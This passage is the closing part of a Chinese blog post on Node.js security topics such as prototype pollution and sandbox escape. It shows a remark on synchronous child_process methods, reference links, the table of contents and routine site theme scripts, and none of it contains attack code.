child_process.spawnSync ()、child_process.execSync () 和 child_process.execFileSync () 方法是同步的，将阻塞 Node.js 事件循环，</p>
<p>暂停任何其他代码的执行，直到衍生的进程退出。</p>
<p>具体的细节大家可以去官方文档看看</p>
<h1 id="0x08-参考文章">0x08 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">深入理解 JavaScript Prototype 污染攻击 </a>–p神</p>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/cnily03/tech/js-prototype-pollution">JavaScript 原型链污染</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7184">Node.js 常见漏洞学习与总结</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11859#toc-0">NodeJS VM和VM2沙箱逃逸</a></p>
<p><a target="_blank" rel="noopener" href="https://ljdd520.github.io/2020/03/14/Node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%80%BB%E7%BB%93/">Node.js常见漏洞学习与总结</a></p>
<p><a target="_blank" rel="noopener" href="http://blog.m1kael.cn/index.php/archives/27/">NodeJs从零到原型链污染</a></p>

<div class="article-footer slide-up fs14">
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    </div>
</article>
<div class="related-wrap slide-up" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/">浅析pearcmd.php漏洞</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/10/28/wu-hui-xian-ming-ling-zhi-xing/">无回显命令执行</a></div></section></div>

<div class="related-wrap slide-up" id="related-posts">
    <section class='header'>
      <div class='title cap theme'>您可能感兴趣的文章</div>
    </section>
    <section class='body'>
    <div class="related-posts"><a class="item" href="\2023\07\26\cors-kua-yu-lou-dong\" title="CORS跨域漏洞"><span class="title">CORS跨域漏洞</span></a></div></section></div>


  <div class="related-wrap md-text slide-up" id="comments">
    <section class='header cmt-title cap theme'>
      <p>感谢大佬们的不吝赐教！</p>

    </section>
    <section class='body cmt-body twikoo'>
      

<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
    </section>
  </div>



<footer class="page-footer slide-up footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper slide-up toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#21-eval"><span class="toc-text">2.1 eval()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22-%E7%B1%BB%E4%BC%BC%E5%91%BD%E4%BB%A4"><span class="toc-text">2.2 类似命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#31-%E7%B1%BB%E7%9A%84%E5%A3%B0%E6%98%8E"><span class="toc-text">3.1 类的声明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32-new-%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88"><span class="toc-text">3.2 new 做了什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#33-%E6%9E%84%E9%80%A0%E5%99%A8-constructor"><span class="toc-text">3.3 构造器 constructor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#34-%E5%8E%9F%E5%9E%8B%E5%92%8C%E7%BB%A7%E6%89%BF"><span class="toc-text">3.4 原型和继承</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#35-%E5%8E%9F%E5%9E%8B%E5%AF%B9%E8%B1%A1-prototype-%E5%92%8C-proto"><span class="toc-text">3.5 原型对象 prototype 和 proto</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#36-%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%8E%9F%E5%9E%8B%E9%93%BEnew-%E5%88%B0%E5%BA%95%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88"><span class="toc-text">3.6 继承与原型链：new 到底做了什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#37-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-text">3.7 原型链污染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#41-prototype%E5%92%8C__proto__%E5%88%86%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-text">4.1 prototype和__proto__分别是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#42-javascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%BB%A7%E6%89%BF"><span class="toc-text">4.2 JavaScript原型链继承</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#43-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-text">4.3 原型链污染是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#44-%E5%93%AA%E4%BA%9B%E6%83%85%E5%86%B5%E4%B8%8B%E5%8E%9F%E5%9E%8B%E9%93%BE%E4%BC%9A%E8%A2%AB%E6%B1%A1%E6%9F%93"><span class="toc-text">4.4 哪些情况下原型链会被污染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#45-code-breaking-2018-thejs-%E5%88%86%E6%9E%90"><span class="toc-text">4.5 Code-Breaking 2018 Thejs 分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#46-tips"><span class="toc-text">4.6 Tips</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#51-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%8E%9F%E7%90%86"><span class="toc-text">5.1 原型链污染原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#52-code-breaking-2018-thejs"><span class="toc-text">5.2 Code-Breaking 2018 Thejs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#53-node-serialize%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce%E6%BC%8F%E6%B4%9Ecve-2017-5941"><span class="toc-text">5.3 node-serialize反序列化RCE漏洞(CVE-2017-5941)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#61-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86"><span class="toc-text">6.1 沙箱逃逸初识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#62-node%E5%B0%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%89%A7%E8%A1%8C%E4%B8%BA%E4%BB%A3%E7%A0%81"><span class="toc-text">6.2 Node将字符串执行为代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#63-nodejs%E4%BD%9C%E7%94%A8%E5%9F%9F"><span class="toc-text">6.3 Nodejs作用域</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64-vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-text">6.4 vm沙箱逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#65-vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%85%B6%E4%BB%96%E6%83%85%E5%86%B5"><span class="toc-text">6.5 vm沙箱逃逸的一些其他情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#66-vm2"><span class="toc-text">6.6 vm2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#67-vm2%E4%B8%AD%E7%9A%84%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87"><span class="toc-text">6.7 vm2中的沙箱绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cve-2019-10761"><span class="toc-text">CVE-2019-10761</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cve-2021-23449"><span class="toc-text">CVE-2021-23449</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%B8%8A%E7%9A%84%E5%8F%A6%E5%A4%96%E4%B8%80%E4%B8%AAtrick"><span class="toc-text">知识星球上的另外一个trick</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#68-%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3"><span class="toc-text">6.8 简单理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#69-javascript%E5%A4%A7%E5%B0%8F%E5%86%99%E7%89%B9%E6%80%A7"><span class="toc-text">6.9 javascript大小写特性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#610-ctf%E9%A2%98%E5%AE%9E%E4%BE%8B-hacktm%E4%B8%AD%E7%9A%84%E4%B8%80%E9%81%93nodejs%E9%A2%98"><span class="toc-text">6.10 CTF题实例 - Hacktm中的一道Nodejs题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#71-fs-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="toc-text">7.1 fs 文件系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#72-%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%B1%95%E5%BC%80"><span class="toc-text">7.2 全局变量展开</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#73-child_process"><span class="toc-text">7.3 child_process</span></a></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.28.1" async></script>

<!-- optional -->

  <script>
    function load_twikoo() {
        if (!document.querySelectorAll("#twikoo_container")[0]) return;
        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
            const el = document.getElementById("twikoo_container");
            var path = el.getAttribute('comment_id');
            if (!path) {
                path = decodeURI(window.location.pathname);
            }
            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
                el: '#twikoo_container',
                path: path,
            }));
        });
    }

    window.addEventListener('DOMContentLoaded', (event) => {
        load_twikoo();
    });
</script>



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/scrollReveal.js/4.0.9/scrollreveal.min.js"></script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const slideUp = {
      distance: `16px`,
      duration: `800`,
      interval: `100`,
      scale: `1`,
      opacity: 0,
      easing: "ease-out"
    };
    ScrollReveal().reveal('.l_left .slide-up', slideUp);
    ScrollReveal().reveal('.l_main .slide-up', slideUp);
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->
<script type="text/javascript" src="/custom/js/ZYDark.js"></script>
</div></body></html>
